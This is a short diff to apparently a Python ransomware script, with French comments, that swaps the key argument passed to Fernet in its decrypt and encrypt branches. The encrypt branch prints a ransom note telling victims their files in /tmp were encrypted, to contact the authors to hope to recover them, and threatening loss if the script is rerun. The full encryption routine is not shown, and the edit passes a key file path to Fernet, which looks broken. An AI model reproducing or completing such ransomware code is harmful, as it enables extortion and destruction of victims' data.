@@ -118,12 +118,12 @@ if __name__ == '__main__':
             print('Veuillez spécifier le fichier de clé avec --keyfile')
         else:
             #rware.read_key(keyfile)
-            cryptor = Fernet(key)
+            cryptor = Fernet(keyfile)
 
             rware.crypt_tmp(local_tmp, encrypted=True)
     else: # si je ne déchiffre pas, je chiffre
 
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE main.py SINON VOS FICHIERS SERONT PERDUS.")    
         #rware.read_key(keyfile)
-        cryptor = Fernet(key)
+        cryptor = Fernet(keyfile)
         rware.crypt_tmp(local_tmp) #lancement du chiffrement
